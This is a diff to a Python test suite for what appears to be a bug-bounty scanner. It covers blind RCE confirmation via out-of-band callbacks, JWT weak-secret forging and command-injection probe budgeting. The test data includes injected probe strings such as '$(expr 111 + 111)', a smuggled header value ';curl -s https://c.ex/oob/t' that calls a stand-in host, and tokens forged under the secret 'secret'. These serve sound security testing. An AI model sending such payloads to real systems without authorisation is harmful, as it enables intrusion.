@@ -20,8 +20,10 @@ which is the position a bug-bounty hunt actually starts from:
     the check could never fire in an unauthenticated hunt — the exact hunt where an app handing an
     anonymous visitor an HS256 guest token signed with "secret" is worth catching.
 
-  * The reserved first-parameter slot + per-pass budget that together stop the only CRITICAL check in
-    the suite being starved by whatever ran before it.
+  * The per-pass request budget, which is what actually stopped the only CRITICAL check in the suite
+    being starved by whatever happened to run before it. Two cleverer fixes were tried first and
+    both made things worse, so there are regression tests here for each: reordering the check just
+    starves XSS instead, and registering it twice makes one endpoint report the same class twice.
 
 Offline and deterministic: no network. The collaborator poll is stubbed to the shapes a real one
 produces, and the target side is a fake HTTP client that records what was sent.
@@ -187,9 +189,13 @@ class BlindRceConfirmTests(unittest.TestCase):
         self.assertEqual(finding["severity"], "critical")
         # The control was sent BEFORE the probe, so a hit can never be an artefact of the control
         # simply having had less time to land.
-        self.assertEqual(len(http.fetched), 2)
+        # Three target requests: the bare control, the shell-wrapped probe, and -- only because the
+        # probe called home -- a SECOND bare control, re-sent to re-test the URL-fetcher hypothesis
+        # under the same conditions the probe met.
+        self.assertEqual(len(http.fetched), 3)
         self.assertNotIn("$(", http.fetched[0])
         self.assertIn("%24%28", http.fetched[1])  # $( url-encoded -> the shell-wrapped probe
+        self.assertNotIn("$(", http.fetched[2])
 
     def test_bare_control_also_hit_is_reported_as_url_fetch_not_rce(self) -> None:
         # THE precision guarantee. An unfurler / webhook validator / plain SSRF fetches any URL it
@@ -225,7 +231,9 @@ class BlindRceConfirmTests(unittest.TestCase):
         res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
                                     scope="app.example.com", settings=get_settings(), http=http,
                                     poll_attempts=1, poll_delay_s=0.0)
-        self.assertEqual(res["status"], "no-callback")
+        # "no-callback" would read as "tested, clean". Nothing was sent, so the class was NOT tested.
+        self.assertEqual(res["status"], "not-probed")
+        self.assertFalse(res["ok"])
         self.assertEqual(http.fetched, [], "nothing may be sent for an unattributable token")
 
     def test_out_of_scope_target_is_fail_closed(self) -> None:
@@ -303,6 +311,127 @@ class BlindRceHeaderTests(unittest.TestCase):
                                     scope="app.example.com", settings=get_settings(), http=http,
                                     probe_headers=False, poll_attempts=1, poll_delay_s=0.0)
         self.assertEqual(res["headers_tried"], [])
+
+
+class BlindRceAdjudicationTests(unittest.TestCase):
+    """What the prover does with the evidence once a callback lands."""
+
+    def test_a_late_bare_control_still_defeats_the_rce_claim(self) -> None:
+        # THE defect adversarial review found. The probe used to get four polls over eight seconds
+        # while its control got one read with no delay, so an async URL-fetcher whose bare fetch
+        # landed a moment later was reported as a confirmed CVSS 9.8. The control now gets the
+        # probe's full budget, so "late" is still "answered".
+        class _LateControl(_Collaborator):
+            def poll(self, base, secret, token, **kwargs):
+                seen = self.polls.get(token, 0)
+                self.polls[token] = seen + 1
+                index = self.order.index(token) if token in self.order else -1
+                if seen == 0:
+                    return {"ok": True, "count": 0, "hits": []}
+                # The probe (index 1) answers immediately; the control (index 0) only on its THIRD
+                # read — inside the probe's window, outside a single zero-delay read.
+                if index == 1 or (index == 0 and seen >= 2):
+                    return {"ok": True, "count": 1,
+                            "hits": [{"method": "GET", "path": "/oob/" + token, "ip": "203.0.113.9",
+                                      "headers": {"user-agent": "curl/8.4.0"}}]}
+                return {"ok": True, "count": 0, "hits": []}
+
+        _LateControl(hit_for={1}).install(self)
+        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
+                                    scope="app.example.com", settings=get_settings(), http=_FakeHttp(),
+                                    poll_attempts=4, poll_delay_s=0.0)
+        self.assertEqual(res["status"], "url-fetch")
+        self.assertNotIn("finding", res)
+
+    def test_a_silent_first_control_is_re_tested_before_confirming(self) -> None:
+        # The re-send also covers an app that only services the SECOND request from a new IP: the
+        # original control was request one, so a fresh one is sent and polled before confirming.
+        collab = _Collaborator(hit_for={1}).install(self)
+        http = _FakeHttp()
+        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
+                                    scope="app.example.com", settings=get_settings(), http=http,
+                                    poll_attempts=2, poll_delay_s=0.0)
+        self.assertEqual(res["status"], "confirmed")
+        self.assertEqual(len(collab.order), 3, "control, probe, then a re-sent control")
+
+    def test_an_unestablishable_control_is_reported_as_unproven_not_as_a_fetch(self) -> None:
+        """Failing closed is right; describing it as something else is not.
+
+        When the second control cannot be minted the prover refuses to claim execution -- correct,
+        since the whole severity rests on the bare URL having stayed silent. But it must not then say
+        "the target fetched the bare URL", which is a different claim and an unsupported one.
+        """
+        class _NoFreshTokens(_Collaborator):
+            def poll(self, base, secret, token, **kwargs):
+                seen = self.polls.get(token, 0)
+                self.polls[token] = seen + 1
+                index = self.order.index(token) if token in self.order else -1
+                if index >= 2:
+                    # Every token minted AFTER the first control+probe pair looks already-used, so no
+                    # re-control can ever be attributed.
+                    return {"ok": True, "count": 7, "hits": [{"method": "GET"}]}
+                if seen == 0:
+                    return {"ok": True, "count": 0, "hits": []}
+                if index == 1:
+                    return {"ok": True, "count": 1,
+                            "hits": [{"method": "GET", "path": "/oob/" + token, "ip": "203.0.113.9",
+                                      "headers": {"user-agent": "curl/8.4.0"}}]}
+                return {"ok": True, "count": 0, "hits": []}
+
+        _NoFreshTokens(hit_for={1}).install(self)
+        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
+                                    scope="app.example.com", settings=get_settings(), http=_FakeHttp(),
+                                    poll_attempts=2, poll_delay_s=0.0)
+        self.assertEqual(res["status"], "url-fetch")
+        self.assertEqual(res["control"], "unverifiable")
+        self.assertNotIn("finding", res)
+        self.assertIn("could not be established", res["reason"])
+        self.assertNotIn("the target fetched the BARE callback URL", res["reason"])
+
+    def test_an_application_client_user_agent_downgrades_the_claim(self) -> None:
+        # The payload only ever runs curl/wget. A callback from an application HTTP stack is evidence
+        # against "a shell fetched this", and it is evidence already in hand.
+        _Collaborator(hit_for={1}, ua="python-requests/2.31.0").install(self)
+        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
+                                    scope="app.example.com", settings=get_settings(), http=_FakeHttp(),
+                                    poll_attempts=2, poll_delay_s=0.0)
+        self.assertEqual(res["status"], "candidate")
+
+    def test_the_ua_gate_only_fires_on_positive_contrary_evidence(self) -> None:
+        for ua in ("curl/8.4.0", "Wget/1.21.4", "", "   ", "some-unknown-agent"):
+            self.assertFalse(oob._ua_contradicts_shell(ua), ua)
+        for ua in ("python-requests/2.31.0", "Go-http-client/1.1", "okhttp/4.12", "Java/17.0.1",
+                   "axios/1.6", "node-fetch/3", "Googlebot/2.1"):
+            self.assertTrue(oob._ua_contradicts_shell(ua), ua)
+
+    def test_a_hit_with_a_non_dict_headers_field_does_not_crash(self) -> None:
+        # poll_collaborator normalises the body's shape but never the NESTED headers, and every
+        # confirm site reads (hit["headers"]).get("user-agent"). A tainted tunnel could serve a string.
+        raw = {"ok": True, "count": 1, "hits": [{"method": "GET", "headers": "not-a-dict"}]}
+        calls: dict = {}
+
+        def poll(base, secret, token, **kwargs):
+            calls[token] = calls.get(token, 0) + 1
+            return {"ok": True, "count": 0, "hits": []} if calls[token] == 1 else dict(raw)
+
+        self.addCleanup(setattr, oob, "poll_collaborator", oob.poll_collaborator)
+        self.addCleanup(setattr, oob, "_guard_url", oob._guard_url)
+        oob.poll_collaborator = poll
+        oob._guard_url = lambda u, *a, **k: u
+        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
+                                    scope="app.example.com", settings=get_settings(), http=_FakeHttp(),
+                                    poll_attempts=1, poll_delay_s=0.0)
+        self.assertIn(res.get("status"), {"url-fetch", "confirmed", "candidate", "no-callback"})
+
+    def test_the_program_user_agent_survives_the_header_probe(self) -> None:
+        # A program can REQUIRE its researcher marker on every request. _Http.fetch applies
+        # extra_headers after its own UA, so a payload placed there replaced the marker outright.
+        from bughunter.web_scan_service import _USER_AGENT, current_user_agent
+        value = oob._header_value("User-Agent", ";curl -s https://c.ex/oob/t")
+        self.assertTrue(value.startswith(current_user_agent(_USER_AGENT)))
+        self.assertIn(";curl -s", value)
+        # Headers that carry no identity take the payload alone.
+        self.assertEqual(oob._header_value("Referer", ";curl -s x"), ";curl -s x")
 
 
 class JwtKeyUrlInjectionTests(unittest.TestCase):
@@ -408,12 +537,45 @@ class JwtWeakSecretUnauthTests(unittest.TestCase):
         self.assertIsNotNone(found)
         self.assertIn("not sent to the server", found["_active_proof"]["control_result"])
 
-    def test_corroboration_reports_acceptance_when_the_forged_token_returns_the_same_content(self) -> None:
-        http = _FakeHttp(body="the very same authenticated account page")
+    def test_corroboration_is_silent_against_a_server_that_ignores_the_token(self) -> None:
+        # THE false-corroboration case. A wholly public endpoint answers 200 with the same body for
+        # every request, so a body-match gate alone reported "was accepted ... body match 100%" about
+        # a server that never looked at either token. The finding itself stays confirmed either way --
+        # the offline crack self-certifies -- but the narrative must not claim a server-side accept
+        # that did not happen.
+        http = _FakeHttp(body="our public marketing homepage, identical for everyone")
         found = av._check_jwt_weak_secret(http, "https://app.example.com/",
                                           discovered_token=_hs_token("secret"))
         self.assertIsNotNone(found)
-        self.assertIn("was accepted", found["_active_proof"]["control_result"])
+        control = found["_active_proof"]["control_result"]
+        self.assertNotIn("was accepted", control)
+        self.assertIn("not sent to the server", control)
+
+    def test_corroboration_reports_acceptance_only_when_the_server_actually_verifies(self) -> None:
+        # A server that REJECTS a corrupted signature is verifying; if it then accepts our forged
+        # token and returns the authenticated body, "was accepted" is earned.
+        real = _hs_token("secret")
+        page = "the authenticated account page for user 42"
+
+        class _Verifying(_FakeHttp):
+            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
+                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
+                token = (extra_headers or {}).get("Authorization", "").replace("Bearer ", "")
+                head, _, rest = token.partition(".")
+                payload, _, sig = rest.partition(".")
+                # Anything HMAC-signed under the weak secret verifies; the corrupted copy does not.
+                good = (not token) or token == real or sig == _hs_token(
+                    "secret", payload=json.loads(base64.urlsafe_b64decode(payload + "==")) if payload else {}
+                ).split(".")[2]
+                return {"status": 200 if good else 401, "headers": {},
+                        "body": page if good else "unauthorized", "cookies": [],
+                        "final_url": url, "location": None, "elapsed": 0.01}
+
+        found = av._check_jwt_weak_secret(_Verifying(), "https://app.example.com/", discovered_token=real)
+        self.assertIsNotNone(found)
+        control = found["_active_proof"]["control_result"]
+        self.assertIn("was accepted", control)
+        self.assertIn("corrupted-signature copy was rejected", control)
 
 
 class JwtEmbeddedJwkTests(unittest.TestCase):
@@ -536,20 +698,33 @@ class JwtEmbeddedJwkTests(unittest.TestCase):
 
 
 class CommandInjectionBudgetTests(unittest.TestCase):
-    """The reserved slot, the parameter slice, and the transient-error handling."""
+    """Budget sizing, single registration, and the transient-error handling."""
 
-    def test_reserved_slot_probes_only_the_first_parameter(self) -> None:
-        http = _FakeHttp(body="nothing echoed")
-        av._check_rce_command_injection(http, "https://app.example.com/?a=1&b=2&c=3", limit=1)
-        self.assertEqual(len(http.fetched), 2, "one control + one probe for exactly one parameter")
-        self.assertTrue(all("a=" in u for u in http.fetched))
+    def test_command_injection_is_registered_exactly_once(self) -> None:
+        # Regression: an earlier draft registered this check TWICE -- a reserved one-parameter slot
+        # plus the full sweep -- to guarantee the critical class got budget. With two injectable
+        # parameters that emitted TWO critical findings for one endpoint, which a triager penalises,
+        # and it also stole the two requests the fixed-budget re-verify path needed to reach XSS. The
+        # budget was the real problem; duplicating the registration was not the fix.
+        import inspect
+        source = inspect.getsource(av.verify_active)
+        self.assertEqual(source.count("_check_rce_command_injection(http, sanitized"), 1,
+                         "one registration, or a single endpoint yields duplicate criticals")
 
-    def test_skip_avoids_re_probing_the_reserved_parameter(self) -> None:
-        http = _FakeHttp(body="nothing echoed")
-        av._check_rce_command_injection(http, "https://app.example.com/?a=1&b=2&c=3", skip=1)
-        self.assertTrue(http.fetched)
-        self.assertFalse(any("a=gq" in u for u in http.fetched),
-                         "parameter 'a' was already covered by the reserved slot")
+    def test_the_check_returns_one_finding_even_with_several_injectable_parameters(self) -> None:
+        from urllib.parse import urlparse, parse_qsl
+
+        class _ShellEcho(_FakeHttp):
+            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
+                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
+                echoed = " ".join(v.replace("$(expr 111 + 111)", "222").replace("`expr 111 + 111`", "222")
+                                  for _k, v in parse_qsl(urlparse(url).query))
+                return {"status": 200, "headers": {}, "body": "<html>" + echoed + "</html>",
+                        "cookies": [], "final_url": url, "location": None, "elapsed": 0.01}
+
+        found = av._check_rce_command_injection(_ShellEcho(), "https://app.example.com/?cmd=1&host=2&ping=3")
+        self.assertIsNotNone(found)
+        self.assertIn("'cmd'", found["title"])  # returns on the FIRST parameter that answers
 
     def test_one_transient_probe_error_does_not_abandon_the_other_parameters(self) -> None:
         # Regression: the probe fetch used to `break` the parameter loop while its control `continue`d,
@@ -567,13 +742,11 @@ class CommandInjectionBudgetTests(unittest.TestCase):
         self.assertTrue(any("b=" in u for u in http.fetched),
                         "a transient failure on one parameter must not skip the rest")
 
-    def test_suite_reserves_a_command_injection_slot_before_the_xss_pair(self) -> None:
-        import inspect
-        source = inspect.getsource(av.verify_active)
-        first_rce = source.index('("rce"')
-        first_xss = source.index('("xss"')
-        self.assertLess(first_rce, first_xss,
-                        "the only CRITICAL check must get a slot before the budget-heavy XSS pair")
+    def test_budget_seats_the_whole_suite_so_ordering_stops_deciding_recall(self) -> None:
+        # Ordering can only ever choose WHICH class starves. The measured worst-case sweep is 99
+        # requests (three parameters plus the opt-in timing probes), so the default must exceed it --
+        # otherwise the checks at the end of the suite fire nothing, which is the bug being fixed.
+        self.assertGreater(av._DEFAULT_REQUESTS_BUDGET, 99)
 
     def test_default_budget_is_under_the_per_host_governor_ceiling(self) -> None:
         # If the pass budget ever exceeds the bucket, the bucket -- not the budget -- silently decides
@@ -638,7 +811,7 @@ class GovernorLoopbackTests(unittest.TestCase):
         started = time.monotonic()
         for _ in range(3):
             self.assertTrue(gov.throttle("target.example"))
-        self.assertGreaterEqual(time.monotonic() - started, 0.2)
+        self.assertGreaterEqual(time.monotonic() - started, 0.15)
 
     def test_the_volume_cap_still_applies_to_loopback(self) -> None:
         # Only the pacing is waived. The token bucket is what actually bounds what a host absorbs.
